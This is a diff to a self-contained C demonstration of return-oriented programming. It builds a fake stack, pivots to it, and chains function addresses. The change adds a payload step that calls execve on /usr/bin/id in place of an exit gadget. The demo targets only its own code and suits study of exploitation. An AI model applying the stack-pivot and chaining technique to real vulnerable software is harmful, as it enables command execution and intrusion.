@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/mman.h>
+#include <unistd.h>
 
 // boilerplate for functions to make up our rop chain
 #define printfuncname(num) func##num
@@ -32,6 +33,15 @@ printfunc(3)
 void do_exit(int status)
 {
     exit(status);
+}
+
+// something a payload may do; call execve syscall
+void do_execve()
+{
+    char *argv[] = { "/usr/bin/id", NULL };
+    char *envp[] = { NULL };
+
+    execve(argv[0], argv, envp);
 }
 
 /* slightly nasty hack, but lets us access gadget locations through a symbol
@@ -75,12 +85,18 @@ void do_stack_pivot()
     // set up big rop chain in new stack we'll pivot to
     unsigned long *ms = malicious_stack + 2048; // need enough space for functions we call to not segfault
     *ms++ = (unsigned long) malicious_stack + 2048 + 16; // rbp
+    // print 1, 2, 3
     *ms++ = (unsigned long) &printfuncname(1);
     *ms++ = (unsigned long) &printfuncname(2);
     *ms++ = (unsigned long) &printfuncname(3);
+    // execve("/usr/bin/id")
+    *ms++ = (unsigned long) do_execve;
+    /*
+    // exit(42)
     *ms++ = (unsigned long) (gadget_warehouse+10);
     *ms++ = (unsigned long) 42;
     *ms++ = (unsigned long) do_exit;
+    */
 
     // smaller rop chain to do stack pivot
     *saved_rbp = (unsigned long) malicious_stack + 2048;
